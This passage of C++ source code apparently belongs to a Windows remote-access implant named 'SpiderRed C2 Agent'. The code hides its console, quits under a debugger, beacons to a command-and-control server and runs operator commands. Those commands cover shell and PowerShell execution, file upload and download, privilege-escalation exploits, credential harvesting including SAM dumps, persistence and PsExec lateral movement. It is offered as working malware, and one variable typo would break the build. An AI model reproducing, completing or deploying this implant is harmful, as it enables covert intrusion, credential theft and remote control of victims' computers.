        beacon_thread = std::thread(&SpiderRedAgent::BeaconLoop, this);
    }
    
    void Stop() {
        running.store(false);
        if (beacon_thread.joinable()) {
            beacon_thread.join();
        }
    }
    
private:
    void Initialize() {
        #ifndef _DEBUG
        HWND hwnd = GetConsoleWindow();
        if (hwnd) ShowWindow(hwnd, SW_HIDE);
        #endif
        
        if (IsDebuggerPresent()) {
            ExitProcess(0);
        }
        
        #ifdef _DEBUG
        std::cout << "[*] SpiderRed Agent Initialized" << std::endl;
        std::cout << "[*] Hostname: " << Utils::GetComputerName() << std::endl;
        std::cout << "[*] Username: " << Utils::GetUserName() << std::endl;
        std::cout << "[*] C2 Server: " << C2_SERVER << ":" << C2_PORT << std::endl;
        #endif
    }
    
    void BeaconLoop() {
        int beacon_count = 0;
        
        while (running.load()) {
            try {
                beacon_count++;
                
                #ifdef _DEBUG
                std::cout << "\n[*] Sending beacon #" << beacon_count << std::endl;
                #endif
                
                std::string beacon_response = communicator.SendBeacon();
                
                #ifdef _DEBUG
                if (!beacon_response.empty()) {
                    std::cout << "[*] Server response: " << beacon_response.substr(0, 100) << "..." << std::endl;
                }
                #endif
                
                std::vector<std::pair<int, std::string>> commands = communicator.GetCommands();
                
                for (const auto& cmd : commands) {
                    std::string result = ExecuteCommand(cmd.second);
                    std::string response = communicator.SendCommandResult(cmd.first, result);
                    
                    #ifdef _DEBUG
                    std::cout << "[*] Executed command: " << cmd.second << std::endl;
                    std::cout << "[*] Result length: " << result.length() << " bytes" << std::endl;
                    #endif
                    
                    Sleep(1000);
                }
                
                DWORD sleep_time = (CHECKIN_INTERVAL * 1000) + 
                                  (GetTickCount64() % (JITTER * 1000));
                
                #ifdef _DEBUG
                std::cout << "[*] Sleeping for " << (sleep_time / 1000) << " seconds" << std::endl;
                #endif
                
                Sleep(sleep_time);
                
            } catch (const std::exception& e) {
                #ifdef _DEBUG
                std::cerr << "[!] Error in beacon loop: " << e.what() << std::endl;
                #endif
                Sleep(60000);
            } catch (...) {
                #ifdef _DEBUG
                std::cerr << "[!] Unknown error in beacon loop" << std::endl;
                #endif
                Sleep(60000);
            }
        }
    }
    
    std::string ExecuteCommand(const std::string& cmd_line) {
        std::vector<std::string> parts = Utils::Split(cmd_line, ' ');
        if (parts.empty()) return "[-] Empty command";
        
        std::string cmd = parts[0];
        std::string args;
        for (size_t i = 1; i < parts.size(); i++) {
            args += parts[i] + " ";
        }
        
        if (cmd == "info") {
            return InfoCollector::CollectAll();
        }
        else if (cmd == "shell") {
            return Utils::ExecuteCommand(args);
        }
        else if (cmd == "powershell" || cmd == "ps") {
            return Utils::ExecutePowerShell(args);
        }
        else if (cmd == "upload") {
            std::vector<std::string> files = Utils::Split(args, ' ');
            if (files.size() >= 1) {
                return FileModule::Upload(files[0]);
            }
            return "[-] Usage: upload <local_file_path>";
        }
        else if (cmd == "download") {
            std::vector<std::string> urls = Utils::Split(args, ' ');
            if (urls.size() >= 2) {
                return FileModule::Download(urlls[0], urls[1]);
            }
            return "[-] Usage: download <url> <save_path>";
        }
        else if (cmd == "privesc") {
            if (args.find("check") != std::string::npos) {
                return PrivilegeEscalation::CheckAll();
            } else if (args.find("exploit") != std::string::npos) {
                return PrivilegeEscalation::Exploit();
            }
            return "[-] Usage: privesc <check|exploit>";
        }
        else if (cmd == "creds") {
            if (args.find("all") != std::string::npos) {
                return CredentialHarvester::HarvestAll();
            } else if (args.find("sam") != std::string::npos) {
                return CredentialHarvester::DumpSAM();
            }
            return "[-] Usage: creds <all|sam>";
        }
        else if (cmd == "persist") {
            return PersistenceModule::Establish();
        }
        else if (cmd == "lateral") {
            if (args.find("shares") != std::string::npos) {
                return LateralMovement::EnumerateShares();
            }
            std::vector<std::string> lateral_parts = Utils::Split(args, ' ');
            if (lateral_parts.size() >= 4 && lateral_parts[0] == "psexec") {
                std::string host = lateral_parts[1];
                std::string user = lateral_parts[2];
                std::string pass = lateral_parts[3];
                std::string command;
                for (size_t i = 4; i < lateral_parts.size(); i++) {
                    command += lateral_parts[i] + " ";
                }
                return LateralMovement::PSExec(host, user, pass, command);
            }
            return "[-] Usage: lateral <shares|psexec host user password command>";
        }
        else if (cmd == "ls" || cmd == "dir") {
            std::string path = args.empty() ? "." : args;
            return FileModule::ListDirectory(path);
        }
        else if (cmd == "sleep") {
            if (!args.empty()) {
                try {
                    int seconds = std::stoi(args);
                    Sleep(seconds * 1000);
                    return "[+] Slept for " + args + " seconds";
                } catch (...) {
                    return "[-] Invalid sleep time";
                }
            }
            return "[-] Usage: sleep <seconds>";
        }
        else if (cmd == "exit") {
            running.store(false);
            return "[+] Agent terminating...";
        }
        else {
            return Utils::ExecuteCommand(cmd_line);
        }
    }
};

// ==================== MAIN ====================
int main() {
    #ifdef _DEBUG
    AllocConsole();
    FILE* f;
    freopen_s(&f, "CONOUT$", "w", stdout);
    #endif
    
    std::cout << "========================================\n";
    std::cout << "       SpiderRed C2 Agent v2.0\n";
    std::cout << "========================================\n\n";
    
    // Intentar elevar privilegios si no somos admin
    if (!Utils::IsElevated()) {
        std::cout << "[!] Running as normal user\n";
        std::cout << "[*] Attempting privilege elevation...\n";
        
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        
        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.lpVerb = "runas";
        sei.lpFile = exePath;
        sei.nShow = SW_HIDE;
        
        if (ShellExecuteExA(&sei)) {
            std::cout << "[+] Elevation attempt sent\n";
            return 0;
        } else {
            std::cout << "[-] Elevation failed, continuing as user\n";
        }
    } else {
        std::cout << "[+] Running as Administrator\n";
    }
    
    std::cout << "[*] C2 Server: " << C2_SERVER << ":" << C2_PORT << "\n";
    std::cout << "[*] Starting agent...\n\n";
    
    try {
        SpiderRedAgent agent;
        agent.Start();
        
        #ifdef _DEBUG
        std::cout << "[*] Agent started. Press Ctrl+C to exit.\n";
        #endif
        
        // Mantener el thread principal vivo
        while (true) {
            Sleep(10000);
        }
        
    } catch (const std::exception& e) {
        std::cerr << "[!] Fatal error: " << e.what() << std::endl;
        return 1;
    } catch (...) {
        std::cerr << "[!] Unknown fatal error" << std::endl;
        return 1;
    }
    
    return 0;
}
